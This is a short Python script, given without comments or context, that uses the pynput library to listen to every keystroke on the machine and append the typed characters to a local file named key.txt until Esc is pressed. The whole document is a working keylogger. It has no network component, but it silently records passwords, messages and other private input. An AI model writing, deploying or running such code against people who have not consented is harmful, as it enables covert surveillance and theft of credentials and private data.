import logging
from pynput import keyboard

words = []
string = ""
count = 0


def on_press(event) : 
    global words, count

    words.append(event)
    count += 1

    if count == 1 :
        append_list_file(words)
        words = []
        count = 0

def on_release(event) : 
    if event == keyboard.Key.esc : 
        return False

def append_list_file(words) : 
    #words = [word for word in words if not "space" in str(words)]
    
    with open("key.txt", 'a') as f :
        for word in words : 
            word = str(word).replace("'","")
            if word.find("space") > 0 : 
                f.write("\n")
            elif word.find("Key") == -1 : 
                f.write(word)
            elif "\n" in word :
                f.write(word.strip("\n"))
  
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener : 
    listener.join()









